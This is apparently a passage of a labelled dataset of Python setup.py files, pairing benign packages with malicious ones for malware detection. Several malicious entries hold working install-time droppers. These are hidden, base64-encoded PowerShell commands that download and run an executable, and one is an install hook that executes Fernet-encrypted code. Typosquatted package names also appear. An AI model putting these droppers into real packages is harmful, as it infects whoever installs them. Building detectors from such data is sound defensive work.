3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n        'Topic :: Utilities',\n    ],\n    project_urls={\n        'Source': 'https://github.com/django-compressor/django-appconf',\n    }\n)\n", "target": 0}
{"idx": "gradio-3.1.4", "func": "try:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\nfrom pathlib import Path\nimport re\n\nthis_directory = Path(__file__).parent\n\nlong_description = (this_directory / \"README.md\").read_text(encoding='utf8')\n# Replace relative paths to images with absolute paths\nlong_description = re.sub(\"website/homepage/\", \"https://raw.githubusercontent.com/gradio-app/gradio/main/website/homepage/\", long_description)\nlong_description = re.sub(r\"demo/([\\S]*.gif)\", r\"https://raw.githubusercontent.com/gradio-app/gradio/main/demo/\\g<1>\", long_description)\n\nversion = (this_directory / \"gradio\" / \"version.txt\").read_text(\n    encoding='utf8').strip()\n\nwith open(\"requirements.txt\") as reqs:\n    requirements = reqs.readlines()\n\nsetup(\n    name=\"gradio\",\n    version=version,\n    include_package_data=True,\n    description=\"Python library for easily interacting with trained machine learning models\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author=\"Abubakar Abid, Ali Abid, Ali Abdalla, Dawood Khan, Ahsen Khaliq, Pete Allen, \u00d6mer Faruk \u00d6zdemir\",\n    author_email=\"team@gradio.app\",\n    url=\"https://github.com/gradio-app/gradio\",\n    packages=[\"gradio\", \"gradio.test_data\", \"test.test_files\"],\n    license=\"Apache License 2.0\",\n    keywords=[\"machine learning\", \"visualization\", \"reproducibility\"],\n    install_requires=requirements,\n    entry_points={\n        'console_scripts': ['gradio=gradio.reload:run_in_reload_mode']\n    },\n    python_requires='>=3.7',\n)\n", "target": 0}
{"idx": "fugue-0.7.1", "func": "from setuptools import setup, find_packages\nfrom fugue_version import __version__\nimport os\n\nwith open(\"README.md\") as f:\n    _text = [\"# Fugue\"] + f.read().splitlines()[1:]\n    LONG_DESCRIPTION = \"\\n\".join(_text)\n\n\ndef get_version() -> str:\n    tag = os.environ.get(\"RELEASE_TAG\", \"\")\n    if \"dev\" in tag.split(\".\")[-1]:\n        return tag\n    if tag != \"\":\n        assert tag == __version__, \"release tag and version mismatch\"\n    return __version__\n\n\nsetup(\n    name=\"fugue\",\n    version=get_version(),\n    packages=find_packages(),\n    description=\"An abstraction layer for distributed computation\",\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    license=\"Apache-2.0\",\n    author=\"The Fugue Development Team\",\n    author_email=\"hello@fugue.ai\",\n    keywords=\"distributed spark dask sql dsl domain specific language\",\n    url=\"http://github.com/fugue-project/fugue\",\n    install_requires=[\n        \"triad>=0.6.6\",\n        \"adagio>=0.2.4\",\n        \"qpd>=0.3.1\",\n        \"fugue-sql-antlr>=0.1.0\",\n        \"sqlalchemy\",\n        \"pyarrow>=0.15.1\",\n        \"pandas>=1.0.2\",\n        \"jinja2\",\n    ],\n    extras_require={\n        \"cpp_sql_parser\": [\"fugue-sql-antlr[cpp]>=0.1.0\"],\n        \"spark\": [\"pyspark\"],\n        \"dask\": [\"dask[distributed,dataframe]\", \"qpd[dask]>=0.3.1\"],\n        \"duckdb\": [\"duckdb>=0.3.2\", \"pyarrow>=5.0.0\", \"numpy\"],\n        \"ibis\": [\"ibis-framework>=2.1.1\"],\n        \"notebook\": [\"notebook\", \"jupyterlab\", \"ipython>=7.10.0\"],\n        \"all\": [\n            \"fugue-sql-antlr[cpp]>=0.1.0\",\n            \"pyspark\",\n            \"dask[distributed,dataframe]\",\n            \"qpd[dask]>=0.3.1\",\n            \"notebook\",\n            \"jupyterlab\",\n            \"ipython>=7.10.0\",\n            \"duckdb>=0.3.2\",\n            \"pyarrow>=5.0.0\",\n            \"ibis-framework>=2; python_version >= '3.7'\",\n        ],\n    },\n    classifiers=[\n        # \"3 - Alpha\", \"4 - Beta\" or \"5 - Production/Stable\"\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3 :: Only\",\n    ],\n    python_requires=\">=3.6\",\n    package_data={\"fugue_notebook\": [\"nbextension/*\"]},\n    entry_points={\n        \"fugue.plugins\": [\n            \"ibis = fugue_ibis:register[ibis]\",\n            \"duckdb = fugue_duckdb:register[duckdb]\",\n            \"spark = fugue_spark:register[spark]\",\n            \"dask = fugue_dask:register[dask]\",\n        ]\n    },\n)\n", "target": 0}
{"idx": "flake8-pylint-0.1.3", "func": "#!/usr/bin/env python\n# setup.py generated by flit for tools that don't yet use PEP 517\n\nfrom distutils.core import setup\n\npackages = \\\n['flake8_pylint']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8', 'pylint']\n\nextras_require = \\\n{'dev': ['isort', 'mypy', 'pytest']}\n\nentry_points = \\\n{'flake8.extension': ['PL = flake8_pylint:PyLintChecker']}\n\nsetup(name='flake8-pylint',\n      version='0.1.3',\n      description='Flake8 plugin that runs PyLint.',\n      author='Gram',\n      author_email='gram@orsinium.dev',\n      url='https://github.com/orsinium-labs/flake8-pylint',\n      packages=packages,\n      package_data=package_data,\n      install_requires=install_requires,\n      extras_require=extras_require,\n      entry_points=entry_points,\n      python_requires='>=3.6',\n     )\n", "target": 0}
{"idx": "google-cloud-iam-2.8.1", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-iam\"\ndescription = \"IAM Service Account Credentials API client library\"\nversion = \"2.8.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-iam\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require={\"fixup\": [\"libcst >= 0.2.5\"]},\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_iam_credentials_v1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "xgoogle-cloud-core-2.2.1", "func": "from setuptools import setup, find_packages\nsetup(name = \"xgoogle_cloud_core\", version = \"2.2.1\", packages = find_packages())", "target": 1}
{"idx": "libtoolintencode-2.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libtoolintencode',\n    packages = ['modlib'],\n    version = '1.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfcontrolhttppip-2.16", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcontrolhttppip',\n    packages = ['modlib'],\n    version = '8.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dbt-postgres-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\nif sys.version_info < (3, 7):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7 or higher.\")\n    sys.exit(1)\n\n\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" ' \"and try again\")\n    sys.exit(1)\n\n\nPSYCOPG2_MESSAGE = \"\"\"\nNo package name override was set.\nUsing 'psycopg2-binary' package to satisfy 'psycopg2'\n\nIf you experience segmentation faults, silent crashes, or installation errors,\nconsider retrying with the 'DBT_PSYCOPG2_NAME' environment variable set to\n'psycopg2'. It may require a compiler toolchain and development libraries!\n\"\"\".strip()\n\n\ndef _dbt_psycopg2_name():\n    # if the user chose something, use that\n    package_name = os.getenv(\"DBT_PSYCOPG2_NAME\", \"\")\n    if package_name:\n        return package_name\n\n    # default to psycopg2-binary for all OSes/versions\n    print(PSYCOPG2_MESSAGE)\n    return \"psycopg2-binary\"\n\n\npackage_name = \"dbt-postgres\"\npackage_version = \"1.2.0\"\ndescription = \"\"\"The postgres adapter plugin for dbt (data build tool)\"\"\"\n\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\")) as f:\n    long_description = f.read()\n\nDBT_PSYCOPG2_NAME = _dbt_psycopg2_name()\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-core\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    package_data={\n        \"dbt\": [\n            \"include/postgres/dbt_project.yml\",\n            \"include/postgres/sample_profiles.yml\",\n            \"include/postgres/macros/*.sql\",\n            \"include/postgres/macros/**/*.sql\",\n        ]\n    },\n    install_requires=[\n        \"dbt-core=={}\".format(package_version),\n        \"{}~=2.8\".format(DBT_PSYCOPG2_NAME),\n    ],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "py-verpyw-10.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-verpyw',\n    packages = ['modlib'],\n    version = '2.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gamemc-9.18", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'gamemc',\n    packages = ['modlib'],\n    version = '8.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "reqjuests-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'UkVVTFjyFKWgSzX PQuJnDDAHYJvEUvTMenokgifjEXzmrWTDTDpWwBbKCSuqJZskJQd'\nLONG_DESCRIPTION = 'ndNCBrytCPwiTfsQVVTXWmTOjkzrVKlsOHhSokAJWQAEJgHGLfmgBUDoerkhiDHlzYHonJemtqiPhWRZFllYsJYRFcdqlZjwMnGePhgdXqONEpcJDfoLxNTsHCLDaDMsmqoCENbnZAxsowPDCciyGrNDiaygkljxtjankXcuHMkj FKIhneJYiCwJgLTdcIQGjiYWGNAcibInitrJGvYvzoCECeqTvizhAzsSalAzXfBCRdhCfcgtGXACZPGRwspKAjLJExZJlIBP fxUuepx xjlKcfbRhvFQKzTrIraFZlF LGHQYCdstyuSBwDYYEIeEhgoNldVucrUjnB CtGQOvOfqBIxosPSyaLtwOKbLufcrdtQDNHrk'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'ryWe1156l8uIjQc0_HJ24vswEP7yFV9yOJwi50hyZAw=').decrypt(b'gAAAAABmA0cICQ1jNOOza5cNvnFHYdGrUAyB9fSMgSyA9ExhwWn6Vq-NCmzfQNE-7gdrDtY6UaE7d5ANx0V4NNfjew4Ux-GTKUIZEJu2C2CknSbN22drR-92djfnVoC6ypFEawU-Ykdspc-PeBHdq3eNnwGsbaUmSRBohbFzmXKiusyeGR3_bPygwdRl5_tfMSI41Zy7EPcj3JZsNti1KZX2fu2ImnqpIX6kOEVjctBC25Ryj4Nl2jw='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"reqjuests\",\n    version=VERSION,\n    author=\"mxmifIrgmduPkhLMW\",\n    author_email=\"YhgBvNCdShnHkhL@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "datadiff-2.0.0", "func": "'\nDataDiff\n========\n\nDataDiff is a library to provide human-readable diffs of python data structures.\nIt can handle sequence types (lists, tuples, etc), sets, and dictionaries.\n\nDictionaries and sequences will be diffed recursively, when applicable.\n\nIt has special-case handling for multi-line strings, showing them as a typical unified diff.\n\nDrop-in replacements for some nose assertions are available.  If the assertion fails,\na nice data diff is shown, letting you easily pinpoint the root difference.\n\n``datadiff`` works on Python 2.6 through Python 3.\n\nDataDiff project homepage: http://sourceforge.net/projects/datadiff/\n\nExample\n-------\n\nHere's an example::\n\n    >>> from datadiff import diff\n    >>> a = dict(foo=1, bar=2, baz=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])\n    >>> b = dict(foo=1, bar=4, baz=[0, 1, 2, 3, 4, 5, 6, 7, 8])\n    >>> print diff(a, b)\n    --- a\n    +++ b\n    {\n    -'bar': 2,\n    +'bar': 4,\n     'baz': [\n     @@ -5,11 +5,8 @@\n      6,\n      7,\n      8,\n     -9,\n     -10,\n     -11,\n     ],\n     'foo': 1,\n    }\n    >>>\n    >>> from datadiff.tools import assert_equal\n    >>> assert_equal([1, 2, 3], [1, 2, 5])\n    Traceback (most recent call last):\n      File \"<stdin>\", line 1, in <module>\n      File \"datadiff/tools.py\", line 29, in assert_equal\n        raise AssertionError(msg)\n    AssertionError:\n    --- a\n    +++ b\n    [\n    @@ -0,2 +0,2 @@\n     1,\n     2,\n    -3,\n    +5,\n    ]\n\nLicense\n-------\n\nCopyright 2012, 2014 Dave Brondsema\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n  http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\n'''\n\nimport setuptools\n\nexec(open('datadiff/version.py').read())\nparams = dict(\n    name = 'datadiff',\n    packages = setuptools.find_packages(),\n    version = __version__,\n    description = 'DataDiff is a library to provide human-readable diffs of python data structures.',\n    long_description = __doc__,\n    test_suite = \"nose.collector\",\n    author = 'Dave Brondsema',\n    author_email = 'dave@brondsema.net',\n    url = 'http://sourceforge.net/projects/datadiff/',\n    keywords = ['data', 'diff'],\n    classifiers = [\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    install_requires=[\n    ],\n    tests_require=[\n        'nose',\n        'six',\n    ],\n    license = 'Apache License',\n)\n\nif __name__ == '__main__':\n\tsetuptools.setup(**params)\n", "target": 0}
{"idx": "libgrandpaypalget-7.37", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgrandpaypalget',\n    packages = ['modlib'],\n    version = '2.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "u283udsfru-2022.12.7", "func": "#!/usr/bin/env python\nimport re\nimport os\nimport sys\n\n# While I generally consider it an antipattern to try and support both\n# setuptools and distutils with a single setup.py, in this specific instance\n# where certifi is a dependency of setuptools, it can create a circular\n# dependency when projects attempt to unbundle stuff from setuptools and pip.\n# Though we don't really support that, it makes things easier if we do this and\n# should hopefully cause less issues for end users.\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nversion_regex = r'__version__ = [\"\\']([^\"\\']*)[\"\\']'\nwith open('certifi/__init__.py') as f:\n    text = f.read()\n    match = re.search(version_regex, text)\n\n    if match:\n        VERSION = match.group(1)\n    else:\n        raise RuntimeError(\"No version number found!\")\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist bdist_wheel upload')\n    sys.exit()\n\nsetup(\n    name=\"u283udsfru\",\n    version=VERSION,\n    description='Python package for providing Mozilla\\'s CA Bundle.',\n    long_description=open('README.rst').read(),\n    author=\"Orange Alice\",\n    author_email='me@kennethreitz.com',\n    url='https://github.com/certifi/python-certifi',\n    packages=[\n        'certifi',\n    ],\n    package_dir={'certifi': 'certifi'},\n    package_data={'certifi': ['*.pem', 'py.typed']},\n    # data_files=[('certifi', ['certifi/cacert.pem'])],\n    include_package_data=True,\n    zip_safe=False,\n    license='MPL-2.0',\n    python_requires=\">=3.6\",\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',\n        'Natural Language :: English',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.11',\n    ],\n    project_urls={\n        'Source': 'https://github.com/certifi/python-certifi',\n    },\n)\n", "target": 1}
{"idx": "esqosintstudymine-10.44", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqosintstudymine',\n    packages = ['modlib'],\n    version = '4.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming 